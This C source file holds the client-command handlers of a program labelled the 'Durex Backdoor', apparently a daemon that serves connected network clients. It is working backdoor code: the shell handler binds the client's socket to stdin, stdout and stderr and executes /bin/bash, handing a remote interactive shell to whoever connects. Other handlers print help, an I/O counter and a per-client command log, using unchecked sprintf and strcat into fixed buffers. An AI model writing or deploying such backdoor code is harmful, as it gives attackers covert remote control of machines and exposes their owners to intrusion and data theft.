#include "../../include/durex.h"

void 	msg_to_client(t_deamon *durex)
{
	for (int i = 0; i < MAX_CLIENTS; ++i)
	{
		if (FD_ISSET(durex->clients[i].fd, &durex->fd_write))
		{
			send(durex->clients[i].fd, durex->clients[i].write_buffer, strlen(durex->clients[i].write_buffer), 0);
			bzero(durex->clients[i].write_buffer, sizeof(durex->clients[i].write_buffer));
		}
	}
}

void 	cmd_help(t_deamon *durex, int index)
{
	sprintf(durex->clients[index].write_buffer,
			"%sDurex Backdoor%s\n" \
			"  %scmd:%s\n"""
			"    %shelp:%s command list\n" \
			"    %sshell:%s start the shell\n" \
			"    %sio:%s Total size of I/O data\n" \
			"    %slog:%s Total size of I/O data\n" \
			"    %sexit:%s exit backdoor\n" \
			"> " \
			,GREEN, NC, BOLD, NC, BOLD, NC, BOLD, NC, BOLD, NC, BOLD, NC, BOLD, NC);
	strcat(durex->clients[index].log, "help\n");
}

void 	cmd_shell(t_deamon *durex, int index, char **env)
{
	char *av[] = {"/bin/bash", 0};
	pid_t pid;

	pid = fork();
	if (pid == 0)
	{
		char buf[MAX_BUFF] = {0};
		sprintf(buf, "%sShell:\n%s", GREEN, NC);
		for (int i = 0; i < 3; ++i)
			dup2(durex->clients[index].fd, i);
		send(durex->clients[index].fd, buf, strlen(buf), 0);
		execve(av[0], av, env);
	}
	else
	{
		waitpid(pid, 0, 0);
		kill(pid, SIGTERM);
		strcat(durex->clients[index].log, "shell\n");
		send(durex->clients[index].fd, "\n> ", 3, 0);
	}
}

void 	cmd_io(t_deamon *durex, int index)
{
	sprintf(durex->clients[index].write_buffer,
			"Total I/O data: %lu\n> ",
			durex->io_data);
	strcat(durex->clients[index].log, "io\n");
}

void 	cmd_log(t_deamon *durex, int index)
{
	sprintf(durex->clients[index].write_buffer,
			"%s\n> ",
			durex->clients[index].log);
	strcat(durex->clients[index].log, "log\n");
}